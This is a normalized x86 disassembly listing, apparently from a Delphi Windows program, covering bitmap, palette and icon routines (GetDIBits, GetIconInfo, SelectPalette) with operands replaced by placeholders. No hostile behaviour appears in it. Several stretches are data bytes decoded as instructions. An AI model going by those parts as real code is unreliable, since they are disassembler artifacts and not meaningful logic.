jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_422f78
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_423c2c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_423b48
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_423c98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_423b48
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_423d35
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d3c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_423d6c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402b80
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_423d60
xor edx edx
push ebp
push sub_423f5a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_423c2c
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_423c2c
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_423f33
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407e4c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407e4c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407e4c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e4c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_423c98
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_423c98
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f3a
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026fc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026fc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_423f3a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f61
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_423f68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_423fb8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_424010
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_423fb8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424059
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4030b4
mov edi eax
mov eax esi
call sub_4030b4
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424193
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_424176
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407f78
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42417d
mov al 0x1
sub_4241ac
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41a874
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4241f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241fb
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_424200
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_424234
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41a874
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42427f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424286
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_4242b0
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
cld
add [ ecx ] 0x6c
jge r-xdata
popad
je r-xdata
and [ ebx ] dh
ror [ ebx - 0x123d173a ] cl
std
[ edx ]
add al ch
jge r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
and al 0x43
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 ] dh
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x58 ] al
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp + eax * 2 + 0x42 ] bh
add [ esi + edi * 2 - 0x7f03ffbf ] bh
inc ecx
add [ ebp + edi * 2 + 0x41 ] ch
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42442c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_424425
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40313c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_403490
sub_424348
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_424425
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40313c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42442c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
add esp 0xfffffff0
call sub_403490
sub_4243a2
or [ edx ] eax
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_4244c8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_4244c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42442c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
sub_4244c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42454b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404ce8
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_408044
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403f94
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403f94
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_417d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424552
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_42455c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4245da
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417e94
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4030bc
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4041a4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40434c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245e1
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42464c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_4246f8
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_4246f8
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_4246f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4246cc
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40316c
mov eax [ esi + 0x8 ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4246f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_417d38
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42473c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_417d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424760
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_417e94
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_417e94
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4247dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
call sub_42479c
call sub_4247bc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_42481c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_42484c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4030b4
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41858c
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_424880
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4032f8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40316c
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403380
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403380
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403368
sub_4248fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_42498c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_40316c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4030b4
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4249ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_424760
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424a23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_422cb0
mov eax [ ebx + 0xc ]
call sub_40316c
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403380
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403368
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_424a70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_424ae4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_4248fc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4248fc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4184a8
mov edx ebx
mov eax esi
call sub_4248fc
jmp r-xdata
pop esi
pop ebx
retn
sub_424b40
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_424b64
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_424b8c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_424c93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4041a4
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_42455c
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_40316c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424c15
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c9a
lea eax [ ebp - 0x48 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_424c1a
mov eax [ ebp - 0x4 ]
call sub_40316c
call sub_403920
call sub_403974
mov eax [ ebx + 0xc ]
call sub_40316c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c9a
lea eax [ ebp - 0x48 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403380
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_424ca4
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4030bc
lea edx [ esp + 0x40 ]
mov eax esp
